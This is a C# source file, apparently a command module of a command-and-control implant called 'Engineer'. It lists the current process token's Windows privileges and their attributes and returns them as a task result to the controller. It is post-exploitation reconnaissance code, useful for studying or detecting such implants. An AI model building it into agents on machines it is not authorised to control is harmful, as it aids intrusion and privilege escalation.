﻿using Engineer.Commands;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using Engineer.Extra;
using System.Runtime.InteropServices;
using System.Diagnostics;
using static Engineer.Extra.h_reprobate.Win32.WinNT;
using System.Security.AccessControl;
using Engineer.Functions;

namespace Engineer.Commands
{
    internal class GetPrivs : EngineerCommand
    {
        public override string Name => "getPrivs";

        public override async Task Execute(EngineerTask task)
        {
            string output ="";
            try
            {
                var TokenInfLength = 0;
                var ThisHandle = WindowsIdentity.GetCurrent().Token;
                WinAPIs.Advapi.GetTokenInformation(ThisHandle, WinAPIs.Advapi.TOKEN_INFORMATION_CLASS.TokenPrivileges, IntPtr.Zero, TokenInfLength, out TokenInfLength);
                var TokenInformation = Marshal.AllocHGlobal(TokenInfLength);
                if (WinAPIs.Advapi.GetTokenInformation(WindowsIdentity.GetCurrent().Token, WinAPIs.Advapi.TOKEN_INFORMATION_CLASS.TokenPrivileges, TokenInformation, TokenInfLength, out TokenInfLength))
                {
                    var ThisPrivilegeSet = (WinAPIs.WinNT._TOKEN_PRIVILEGES)Marshal.PtrToStructure(TokenInformation, typeof(WinAPIs.WinNT._TOKEN_PRIVILEGES));
                    for (var index = 0; index < ThisPrivilegeSet.PrivilegeCount; index++)
                    {
                        var laa = ThisPrivilegeSet.Privileges[index];
                        var StrBuilder = new System.Text.StringBuilder();
                        var luidNameLen = 0;
                        var luidPointer = Marshal.AllocHGlobal(Marshal.SizeOf(laa.Luid));
                        Marshal.StructureToPtr(laa.Luid, luidPointer, true);
                        WinAPIs.Advapi.LookupPrivilegeName(null, luidPointer, null, ref luidNameLen);
                        StrBuilder.EnsureCapacity(luidNameLen + 1);
                        if (WinAPIs.Advapi.LookupPrivilegeName(null, luidPointer, StrBuilder, ref luidNameLen))
                        {
                            var strPrivilege = StrBuilder.ToString();
                            var strAttributes = String.Format("{0}", (WinAPIs.Advapi.LuidAttributes)laa.Attributes);
                            Marshal.FreeHGlobal(luidPointer);
                            //check that strPrivilege is not null or empty
                            if (!string.IsNullOrEmpty(strPrivilege))
                            {
                                output += strPrivilege + "|" + strAttributes + Environment.NewLine;
                            }
                        }
                    }
                }

                Tasking.FillTaskResults(output,task,EngTaskStatus.Complete,TaskResponseType.String);
            }
            catch(Exception ex)
            {
                Tasking.FillTaskResults("error: " + ex.Message + "\n"+ ex.StackTrace,task,EngTaskStatus.Failed,TaskResponseType.String);
            }

        }
    }
}
